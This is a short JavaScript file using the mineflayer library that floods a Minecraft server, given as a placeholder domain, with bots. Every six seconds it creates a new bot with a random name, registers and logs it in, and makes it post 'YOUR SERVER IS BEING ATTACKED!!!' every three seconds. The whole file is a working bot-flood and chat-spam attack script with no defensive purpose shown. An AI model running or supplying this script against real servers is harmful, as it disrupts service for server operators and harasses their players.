const mineflayer = require('mineflayer');

// CONSTANTS
const HOST = "targetserverdomain.net";
const BOT_PASSWORD = "botbot"
const BOT_USERNAME_PREFIX = "NAMEPREFIX_"
const CHAT_SPAM_MESSAGE = "YOUR SERVER IS BEING ATTACKED!!!"

console.log(`Spamming packets to ${HOST}`)
setInterval(function () {
    const bot = mineflayer.createBot({
        host: HOST,
        username: `${BOT_USERNAME_PREFIX}_${generateName(9)}`,
    })
    bot.on('login', () => {
        bot.chat("/register "+BOT_PASSWORD+" "+BOT_PASSWORD)
        bot.chat("/login "+BOT_PASSWORD)
        const spam = () => bot.chat(CHAT_SPAM_MESSAGE)
        setInterval(spam, 3000)
    })
    bot.on('kicked', console.log)
    bot.on('error', console.log)
}, 6000)

// Bot Name: NAMEPREFIX_generateName(x)
function generateName(length) {
    var result           = [];
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result.push(characters.charAt(Math.floor(Math.random() *
            charactersLength)));
    }
    return result.join('');
}